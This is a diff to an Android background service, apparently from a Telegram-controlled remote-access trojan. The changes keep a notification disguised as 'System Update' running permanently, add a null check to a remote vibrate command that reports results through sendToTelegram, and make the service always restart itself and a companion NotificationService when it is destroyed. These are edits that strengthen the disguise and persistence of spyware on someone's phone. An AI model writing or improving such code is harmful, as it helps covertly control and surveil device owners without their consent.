@@ -29,21 +29,15 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.text.SimpleDateFormat;
 import java.util.Date;
-import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
 
 import okhttp3.Call;
 import okhttp3.FormBody;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
-import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MainService extends Service {
@@ -91,8 +85,9 @@ public class MainService extends Service {
             }
             Notification notification = new NotificationCompat.Builder(this, channelId)
                     .setContentTitle("System Update")
-                    .setContentText("Active")
+                    .setContentText("يعمل في الخلفية...")
                     .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setOngoing(true)
                     .build();
             startForeground(1, notification);
         } catch (Exception e) {
@@ -412,12 +407,16 @@ public class MainService extends Service {
     private void vibrate() {
         try {
             Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+            if (v != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    v.vibrate(2000);
+                }
+                sendToTelegram("📳 Vibrating...");
             } else {
-                v.vibrate(2000);
+                sendToTelegram("❌ Vibrator not available");
             }
-            sendToTelegram("📳 Vibrating...");
         } catch (Exception e) {
             sendToTelegram("❌ Vibrate Error: " + e.getMessage());
         }
@@ -500,7 +499,10 @@ public class MainService extends Service {
             if (timer != null) timer.cancel();
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaPlayer != null) mediaPlayer.release();
-            startService(new Intent(this, MainService.class));
         } catch (Exception e) {}
+        
+        // إعادة تشغيل الخدمة إذا توقفت
+        startService(new Intent(this, MainService.class));
+        startService(new Intent(this, NotificationService.class));
     }
-                }
+}
